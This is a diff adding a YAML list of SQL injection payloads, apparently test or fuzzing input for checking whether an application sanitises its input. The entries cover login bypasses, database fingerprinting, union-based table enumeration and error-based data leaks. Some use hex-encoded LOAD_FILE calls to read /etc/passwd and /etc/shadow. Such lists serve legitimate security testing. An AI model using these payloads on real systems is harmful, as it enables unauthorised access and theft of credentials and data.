@@ -1,0 +1,123 @@
+data:
+  - id: sqlInjectionTest
+    description: Strings which can cause an SQL injection if inputs are not sanitized
+    values:
+      - "' OR 1=1 -- 1"
+      - "' OR '1'='1"
+      - "'"
+      - "\""
+      - "')"
+      - "'))"
+      - "\")"
+      - "\"))"
+      - "/"
+      - ";"
+      - "//"
+      - "\\"
+      - "--"
+      - "-- -"
+
+  - id: databaseVersionOracle
+    description: Identify if database is an Oracle DB
+    values:
+      - "SELECT banner FROM v$version"
+      - "SELECT version FROM v$instance"
+
+  - id: databaseVersionMicrosoft
+    description: Identify if database is a Microsoft DB
+    values:
+      - "SELECT @@version"
+
+  - id: databaseVersionPostgreSQL
+    description: Identify if database is a PostgreSQL DB
+    values:
+      - "SELECT version()"
+
+  - id: databaseVersionMySQL
+    description: Identify if database is a MySQL DB
+    values:
+      - "SELECT @@version"
+
+  - id: mySqlVersionDetection
+    description: Detect MySQL version, may get division by 0 error if MySQL version is higher than 3.23.02
+    values:
+      - "/*! 32302 10*/"
+      - "SELECT /*!32302 1/0, */ 1 FROM tablename"
+
+  - id: mySqlIfStatement
+    description: Get response based on an if statement for MySQL
+    values:
+      - "SELECT IF(1=1,'true','false')"
+
+  - id: sqlServerIfStatement
+    description: Get response based on an if statement for SQL Server
+    values:
+      - "IF (1=1) SELECT 'true' ELSE SELECT 'false'"
+
+  - id: oracleIfStatement
+    description: Get response based on an if statement for Oracle
+    values:
+      - "IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;"
+
+  - id: postgresqlIfStatement
+    description: Get response based on an if statement for PostgreSQL
+    values:
+      - "SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B'END;"
+
+  - id: hexBasedSqlInjection
+    description: Using hex to load different files
+    values:
+      - "SELECT LOAD_FILE(0x633A5C626F6F742E696E69)"
+      - "SELECT LOAD_FILE(0x2F6574632F706173737764)"
+      - "SELECT LOAD_FILE(0x2F6574632F736861646F77)"
+      - "1+union+select+load_file(0x633A5C626F6F742E696E69),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"
+      - "1+union+select+load_file(0x2F6574632F706173737764),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"
+      - "1+union+select+load_file(0x2F6574632F736861646F77),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"
+
+  - id: loginScreenBypass
+    description: Some login SQL bypasses
+    values:
+      - "admin' --"
+      - "admin' #"
+      - "admin'/*"
+      - "admin')) --"
+      - "admin')) #"
+      - "admin')) /*"
+      - "' or 1=1--"
+      - "' or 1=1#"
+      - "' or 1=1/*"
+      - "') or '1'='1--"
+      - "') or '1'='1#"
+      - "') or '1'='1/*"
+      - "') or ('1'='1--"
+      - "') or ('1'='1#"
+      - "') or ('1'='1/*"
+      - "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--"
+
+  - id: bypassingMd5HashCheckLoginScreens
+    description: Bypassing some MD5 hash checks when query prefetches user data (generally used with password value of "1234")
+    values:
+      - "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+
+  - id: findColumnNames
+    description: Find column names
+    values:
+      - "' HAVING 1=1 --"
+      - "' GROUP BY table.columnfromerror1 HAVING 1=1 --"
+      - "' GROUP BY table.columnfromerror1, table.columnfromerror2 HAVING 1=1 --"
+      - "' GROUP BY table.columnfromerror1, table.columnfromerror2, table.columnfromerror(n) HAVING 1=1 --"
+
+  - id: databaseContents
+    description: List additional data in the database
+    values:
+      - "SELECT * FROM all_tables"
+      - "SELECT * FROM information_schema.tables"
+      - "-1’+union+select+1,table_name,3+from+information_schema.tables+where+table_schema=database()+limit+0,1–+"
+      - "-1'+union+select+1,table_name,3+from+information_schema.tables+where+table_schema=database()+limit+0,1–+"
+
+  - id: extractDataThroughVisibleErrorMsg
+    description: You can potentially elicit error messages that leak sensitive data returned by malicious queries
+    values:
+      - "SELECT 'foo' WHERE 1 = (SELECT 'secret')"
+      - "SELECT CAST ((SELECT password FROM users LIMIT 1) AS int)"
+      - "SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))"
